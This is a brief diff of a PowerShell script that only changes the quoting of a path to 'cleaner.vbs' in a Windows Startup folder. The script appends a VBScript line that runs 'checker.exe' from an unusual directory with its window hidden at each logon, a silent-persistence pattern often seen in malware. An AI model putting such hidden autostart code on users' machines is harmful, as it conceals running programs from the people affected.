@@ -1,4 +1,4 @@
-$vbsPath = "C:\users\onsbt\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cleaner.vbs"
+$vbsPath = """C:\users\onsbt\appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cleaner.vbs"""
 
 # The VBScript line to append
 $vbsLine = 'WshShell.Run """C:\ProgramX64\extentions\checker.exe""", 0, False'
